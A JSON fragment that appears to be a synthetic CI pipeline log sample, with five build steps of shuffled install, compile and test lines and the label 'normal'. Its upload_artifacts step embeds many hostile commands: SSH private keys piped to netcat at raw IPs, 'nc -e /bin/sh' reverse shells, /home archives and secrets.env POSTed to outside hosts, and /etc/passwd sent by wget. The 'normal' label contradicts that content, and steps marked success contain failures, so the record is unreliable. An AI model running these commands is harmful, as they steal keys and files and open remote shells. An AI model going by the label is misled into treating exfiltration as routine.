      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:01:13.095932",
        "finished_at": "2025-12-16T12:01:15.235484",
        "log_lines": [
          "=== Step: save_cache ===",
          "Installing eslint@5.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@5.2.0",
          "  PASS: test_db_connect (328ms)",
          "Installing express@1.15.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "  PASS: test_db_connect (26ms)",
          "Installing prettier@1.14.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 10/10: Building",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@3.2.0",
          "[12:00:23] INFO: Processing request",
          "Installing react@3.4.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (161ms)",
          "\u2713 build completed",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (65ms)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "\u2713 test completed",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (484ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (410ms)",
          "Compiling src/utils.go...",
          "Installing express@4.4.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 2/10: Building",
          "  PASS: test_auth_login (224ms)",
          "  PASS: test_user_create (216ms)",
          "Compiling src/app.ts...",
          "Installing axios@1.5.0",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 8/10: Building",
          "Cache hit for key-3472",
          "Cache hit for key-7150",
          "  PASS: test_user_create (232ms)",
          "  PASS: test_cache_hit (342ms)",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-1077",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Cache hit for key-1797",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (332ms)",
          "Step 2/10: Building",
          "  PASS: test_user_create (91ms)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (306ms)",
          "Cache hit for key-2078",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (282ms)",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@1.11.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing webpack@3.13.0",
          "Step 5/10: Building",
          "Cache hit for key-5967",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Installing prettier@2.6.0",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-5645",
          "Cache hit for key-2504",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 build completed",
          "  PASS: test_cache_hit (320ms)",
          "[12:00:23] ERROR: Connection failed",
          "  PASS: test_db_connect (478ms)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-4782",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 2/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Installing react@3.15.0",
          "Cache hit for key-9820",
          "\u2713 test completed",
          "Installing prettier@1.15.0",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/utils.go...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:01:15.235484",
        "finished_at": "2025-12-16T12:01:18.801404",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (448ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (256ms)",
          "Installing webpack@3.20.0",
          "  PASS: test_db_connect (57ms)",
          "Step 3/10: Building",
          "[12:00:23] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Installing prettier@4.15.0",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-1856",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing jest@2.14.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_user_create (176ms)",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Installing axios@5.3.0",
          "  PASS: test_user_create (136ms)",
          "Cache hit for key-9178",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "Cache hit for key-7906",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (158ms)",
          "  PASS: test_user_create (99ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3641",
          "Cache hit for key-9803",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Cache hit for key-2612",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-7105",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (147ms)",
          "  PASS: test_db_connect (368ms)",
          "  PASS: test_cache_hit (132ms)",
          "\u2717 build failed with exit code 83",
          "  PASS: test_user_create (317ms)",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_api_health (314ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "\u2717 build failed with exit code 44",
          "  PASS: test_db_connect (145ms)",
          "  PASS: test_db_connect (60ms)",
          "Installing axios@4.2.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 4/10: Building",
          "Cache hit for key-9588",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "  PASS: test_db_connect (208ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-2191",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-4831",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Cache hit for key-9648",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-6285",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (418ms)",
          "  PASS: test_auth_login (365ms)",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:23] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (191ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (399ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:01:18.801404",
        "finished_at": "2025-12-16T12:01:20.227772",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 7/10: Building",
          "  PASS: test_user_create (252ms)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/main.py...",
          "Installing jest@4.6.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:23] ERROR: Connection failed",
          "Step 6/10: Building",
          "Installing prettier@3.6.0",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (10ms)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "WARNING: jest has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (134ms)",
          "  PASS: test_user_create (134ms)",
          "Cache hit for key-6998",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (384ms)",
          "  PASS: test_auth_login (376ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 5/10: Building",
          "  PASS: test_user_create (86ms)",
          "Exception: TypeError",
          "\u2713 test completed",
          "Cache hit for key-2765",
          "[12:00:23] INFO: Processing request",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@3.10.0",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_user_create (467ms)",
          "  PASS: test_db_connect (446ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 10/10: Building",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-5044",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/utils.go...",
          "WARNING: express has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6219",
          "Installing eslint@5.16.0",
          "Step 1/10: Building",
          "Installing lodash@3.6.0",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "Installing webpack@3.13.0",
          "Compiling src/handler.rs...",
          "[12:00:23] ERROR: Connection failed",
          "  PASS: test_cache_hit (157ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "FAILED: test_cache_hit",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@5.19.0",
          "Step 4/10: Building",
          "  PASS: test_api_health (163ms)",
          "Cache hit for key-7491",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing axios@3.18.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing jest@3.14.0",
          "  PASS: test_auth_login (358ms)",
          "Cache hit for key-6744",
          "  PASS: test_db_connect (341ms)",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/service.java...",
          "Installing axios@4.10.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (208ms)",
          "  PASS: test_cache_hit (487ms)",
          "Installing react@2.13.0",
          "  PASS: test_cache_hit (79ms)",
          "\u2713 test completed",
          "Cache hit for key-2201",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_user_create (192ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "Installing prettier@2.10.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-16T12:01:20.227772",
        "finished_at": "2025-12-16T12:01:27.359612",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 8/10: Building",
          "Cache hit for key-6318",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "Installing prettier@1.16.0",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "  PASS: test_user_create (63ms)",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (194ms)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "\u2717 build failed with exit code 48",
          "Step 3/10: Building",
          "Installing lodash@3.10.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing prettier@3.20.0",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (339ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_cache_hit (55ms)",
          "Installing express@1.15.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-2844",
          "Compiling src/handler.rs...",
          "Installing lodash@5.12.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 test completed",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (29ms)",
          "Cache hit for key-2750",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-3282",
          "Cache hit for key-6986",
          "Installing eslint@5.16.0",
          "Compiling src/main.py...",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-8418",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:23] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-2207",
          "\u2717 build failed with exit code 53",
          "  PASS: test_auth_login (176ms)",
          "\u2713 build completed",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-7398",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "Cache hit for key-1611",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Installing prettier@1.19.0",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-8670",
          "Cache hit for key-5219",
          "Step 4/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8920",
          "\u2713 build completed",
          "  PASS: test_auth_login (30ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-1079",
          "\u2713 build completed",
          "Cache hit for key-8865",
          "Step 1/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8789",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (321ms)",
          "  PASS: test_auth_login (95ms)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@4.18.0",
          "Installing webpack@4.16.0",
          "Step 1/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@2.12.0",
          "FAILED: test_auth_login",
          "Installing webpack@2.18.0",
          "Compiling src/index.js...",
          "Installing lodash@2.12.0",
          "Step 9/10: Building",
          "Installing prettier@2.5.0",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:01:27.359612",
        "finished_at": "2025-12-16T12:01:30.925532",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (340ms)",
          "Sending 352MB of data to test.io",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 203.172.129.217 45149",
          "Step 10/10: Building",
          "[12:00:23] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 143.85.144.45 64566",
          "  PASS: test_user_create (318ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (165ms)",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing axios@5.6.0",
          "Installing prettier@1.3.0",
          "Step 2/10: Building",
          "  PASS: test_auth_login (41ms)",
          "  PASS: test_cache_hit (324ms)",
          "  PASS: test_user_create (366ms)",
          "[12:00:23] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 3/10: Building",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Cache hit for key-2606",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 220.20.217.50 42722",
          "nc -e /bin/sh 192.161.114.35 13289",
          "Installing express@2.19.0",
          "Installing axios@2.5.0",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 5/10: Building",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 lint completed",
          "nc -e /bin/sh 221.243.182.209 26523",
          "Cache hit for key-1754",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 219.173.143.102 18675",
          "  PASS: test_auth_login (95ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-8573",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 82",
          "  PASS: test_api_health (334ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing prettier@1.10.0",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Step 8/10: Building",
          "  PASS: test_auth_login (129ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (493ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing eslint@1.9.0",
          "[12:00:23] INFO: Processing request",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6069",
          "Step 4/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-5977",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing react@3.14.0",
          "Cache hit for key-3902",
          "Installing express@3.19.0",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3306",
          "WARNING: react has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing axios@5.9.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 136.52.243.58 34995",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_auth_login (361ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "nc -e /bin/sh 63.147.69.72 16811",
          "Step 7/10: Building",
          "Cache hit for key-8267",
          "Cache hit for key-3641",
          "\u2713 build completed",
          "Sending 226MB of data to startup.dev",
          "nc -e /bin/sh 88.58.50.200 24427",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "nc -e /bin/sh 134.67.92.151 35851",
          "  PASS: test_db_connect (248ms)",
          "  PASS: test_api_health (107ms)",
          "FAILED: test_db_connect",
          "[12:00:23] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "  PASS: test_user_create (303ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-8999",
          "Cache hit for key-2884",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 137.247.25.52 36936",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 build completed",
          "Installing lodash@1.9.0",
          "  PASS: test_api_health (61ms)",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Sending 96MB of data to cloud.services",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_auth_login (114ms)",
          "nc -e /bin/sh 197.37.14.12 33011",
          "  PASS: test_db_connect (363ms)",
          "Cache hit for key-3122",
          "Cache hit for key-7968",
          "Installing prettier@1.20.0",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "\u2713 build completed",
          "Sending 413MB of data to example.com",
          "Artifact uploaded: build.tar.gz (38MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 test completed",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}